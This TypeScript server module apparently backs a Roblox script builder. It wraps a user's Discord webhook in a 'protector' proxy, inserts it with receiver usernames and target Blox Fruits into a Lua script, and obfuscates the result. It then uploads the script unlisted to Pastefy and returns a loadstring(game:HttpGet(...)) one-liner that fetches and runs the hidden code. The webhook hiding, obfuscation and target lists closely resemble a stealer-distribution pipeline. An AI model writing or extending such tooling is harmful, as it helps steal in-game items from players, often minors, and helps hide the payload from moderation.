'use server';
/**
 * @fileOverview Flow to potentially protect a webhook via an external API,
 * then obfuscate the script containing the final webhook,
 * and finally upload it to Pastefy.
 *
 * - obfuscateScript - Entry function calling the Genkit flow.
 * - ObfuscateScriptInput - Updated input type (webhook + base script parts).
 * - ObfuscateScriptOutput - Output type (obfuscated script loadstring + pastefy link).
 */

import { ai } from '@/ai/ai-instance';
import { z } from 'genkit';
import { obfuscateLuaScript } from '@/services/luaobfuscator'; // Assumes this service exists and expects { script: string } input

// --- Updated Input Schema ---
const ObfuscateScriptInputSchema = z.object({
  webhookUrl: z.string().describe('The Discord webhook URL (raw or protected) entered by the user.'),
  usernamesLuaTable: z.string().describe('Usernames formatted as a Lua table string, e.g., {"user1", "user2"}'),
  fruitsLuaTable: z.string().describe('Fruits formatted as a Lua table string, e.g., {"fruit1", "fruit2"}'),
  baseLoadstring: z.string().describe('The base loadstring part of the script.'),
});
export type ObfuscateScriptInput = z.infer<typeof ObfuscateScriptInputSchema>;

// --- Output Schema (remains the same) ---
const ObfuscateScriptOutputSchema = z.object({
  obfuscatedScript: z.string().describe('The obfuscated Roblox script with loadstring.'),
  pastefyLink: z.string().describe('The link to the Pastefy paste.'),
});
export type ObfuscateScriptOutput = z.infer<typeof ObfuscateScriptOutputSchema>;

// --- Constants ---
const PROTECTED_WEBHOOK_PREFIX = 'https://sharky-on-top.script-config-protector.workers.dev/w/';
const DISCORD_WEBHOOK_REGEX = /^https:\/\/discord(app)?\.com\/api\/webhooks\/(\d+)\/([a-zA-Z0-9_-]+)$/;

// --- Main Exported Function (calls the flow) ---
export async function obfuscateScript(input: ObfuscateScriptInput): Promise<ObfuscateScriptOutput> {
  if (!input.webhookUrl) {
      throw new Error("Webhook URL is required.");
  }
   if (!input.webhookUrl.startsWith(PROTECTED_WEBHOOK_PREFIX) && !DISCORD_WEBHOOK_REGEX.test(input.webhookUrl)) {
       throw new Error("Invalid webhook URL format provided to server action.");
   }
  return obfuscateScriptFlow(input);
}

// --- Genkit Flow Definition ---
const obfuscateScriptFlow = ai.defineFlow<
  typeof ObfuscateScriptInputSchema,
  typeof ObfuscateScriptOutputSchema
>(
  {
    name: 'obfuscateScriptFlow',
    inputSchema: ObfuscateScriptInputSchema,
    outputSchema: ObfuscateScriptOutputSchema,
  },
  async (input) => {
    const { webhookUrl, usernamesLuaTable, fruitsLuaTable, baseLoadstring } = input;
    let finalWebhookUrl = '';

    try {
      // --- Step 1: Determine if Protection is Needed ---
      if (webhookUrl.startsWith(PROTECTED_WEBHOOK_PREFIX)) {
        console.log("Webhook URL is already protected. Skipping protector API call.");
        finalWebhookUrl = webhookUrl;
      } else if (DISCORD_WEBHOOK_REGEX.test(webhookUrl)) {
        console.log("Raw Discord webhook detected. Calling protector API...");
        const protectorApiUrl = process.env.PROTECTOR_API_URL;
        const protectorApiKey = process.env.PROTECTOR_API_SECRET;
        if (!protectorApiUrl || !protectorApiKey) {
          throw new Error('Protector API URL or Key environment variable is not set.');
        }
        const protectResponse = await fetch(protectorApiUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'X-Api-Key': protectorApiKey },
          body: JSON.stringify({ rawWebhookUrl: webhookUrl }),
        });
        if (!protectResponse.ok) {
          const errorText = await protectResponse.text();
          console.error("Protector API Error Response:", errorText);
          throw new Error(`Webhook protector API failed with status ${protectResponse.status}: ${errorText}`);
        }
        const protectData = await protectResponse.json();
        const receivedProtectedUrl = protectData?.protectedUrl;
        if (!receivedProtectedUrl || typeof receivedProtectedUrl !== 'string') {
           console.error("Invalid response from protector API:", protectData);
           throw new Error('Invalid response received from webhook protector API.');
        }
        finalWebhookUrl = receivedProtectedUrl;
        console.log("Received protected URL from API:", finalWebhookUrl);
      } else {
        console.error("Invalid webhook format reached server action:", webhookUrl);
        throw new Error('Invalid webhook URL format.');
      }

      // --- Step 2: Reconstruct the Lua Script with the Final Webhook URL ---
      const scriptToObfuscate = `Webhook = "${finalWebhookUrl}" -- << Final Webhook URL\n` +
                               `Usernames = ${usernamesLuaTable} -- << Usernames\n` +
                               `FruitsToHit = ${fruitsLuaTable} -- << Fruits\n` +
                               `${baseLoadstring}`;
      console.log("Script reconstructed for obfuscation using final webhook.");

      // --- Step 3: Call Lua Obfuscator Service ---
      // NOTE: Removed luaObfuscatorApiKey from this call.
      // The `obfuscateLuaScript` function itself must now handle getting the key,
      // likely by reading process.env.LUAOBFUSCATOR_API_KEY within its own scope.
      console.log("Calling obfuscateLuaScript service...");
      const obfuscationResult = await obfuscateLuaScript({ script: scriptToObfuscate }); // Pass input as an object matching the required schema
      console.log("Script obfuscated successfully.");

      // --- Step 4: Upload to Pastefy ---
      const pastefyApiKey = process.env.PASTEFY_API_KEY;
      if (!pastefyApiKey) {
        throw new Error("PASTEFY_API_KEY environment variable is not set.");
      }
      // Assuming obfuscationResult now correctly contains the obfuscated script string,
      // potentially under a property like 'obfuscatedScript' if it returns an object,
      // or maybe it just returns the string directly. Adjust if needed.
      // Let's assume obfuscateLuaScript returns an object: { obfuscatedScript: string } for consistency
      const scriptContentForPastefy = obfuscationResult?.obfuscatedScript || obfuscationResult; // Handle both cases
      if (!scriptContentForPastefy || typeof scriptContentForPastefy !== 'string') {
          throw new Error("Obfuscation service did not return a valid script string.");
      }

      console.log("Calling Pastefy API...");
      const uploadResponse = await fetch('https://pastefy.app/api/v2/paste', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${pastefyApiKey}`,
        },
        body: JSON.stringify({
          content: scriptContentForPastefy, // Use the result from obfuscation
          title: "Obfuscated Roblox Script",
          type: "PASTE", visibility: "UNLISTED", encrypted: false,
        }),
      });

      if (!uploadResponse.ok) {
        const errorText = await uploadResponse.text();
        console.error("Pastefy API Error Response:", errorText);
        throw new Error(`Pastefy upload failed with status ${uploadResponse.status}: ${errorText}`);
      }
      const uploadData = await uploadResponse.json();
      if (!uploadData || !uploadData.paste || !uploadData.paste.id) {
        console.error("Invalid response from Pastefy API:", uploadData);
        throw new Error('Invalid Pastefy upload response.');
      }
      const pasteId = uploadData.paste.id;
      const pastefyLink = `https://pastefy.app/${pasteId}`;
      const rawUrl = `https://pastefy.app/${pasteId}/raw`;
      console.log("Pastefy upload successful:", pastefyLink);

      // --- Step 5: Return Final Result ---
      return {
        obfuscatedScript: `loadstring(game:HttpGet("${rawUrl}"))()`,
        pastefyLink: pastefyLink,
      };

    } catch (error: any) {
      console.error("Error in obfuscateScriptFlow:", error);
      throw error; // Re-throw for frontend to catch
    }
  }
);

